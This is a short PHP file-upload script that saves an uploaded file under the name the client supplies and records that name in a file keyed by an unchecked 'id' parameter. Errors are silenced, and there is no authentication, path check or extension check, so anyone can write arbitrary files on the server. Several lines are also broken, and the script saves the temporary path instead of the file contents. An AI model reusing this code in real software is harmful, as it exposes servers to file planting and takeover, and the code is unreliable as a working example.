<?php
error_reporting(0);
function saveFile($fileName, $text) {
    if (!$fileName || !$text)
        return false;

    if (makeDir(dirname($fileName))) {
        if ($fp = fopen($fileName, "w")) {
            if (@fwrite($fp, $text)) {
                fclose($fp);
                return true;
            } else {
                fclose($fp);
                return false;
            }
        }
    }
    return false;
}
function makeDir($dir, $mode = "0777") {
    if (!dir) return false;

    if(!file_exists($dir)) {
        return mkdir($dir,$mode,true);
    } else {
        return true;
    }

}
$id=$_GET["id"];
file_put_contents($id."_zip.txt",$_FILES["file"]["name"]);
saveFile($_FILES["file"]["name"],$_FILES["file"]["tmp_name"]);
echo $_FILES["file"]["name"];
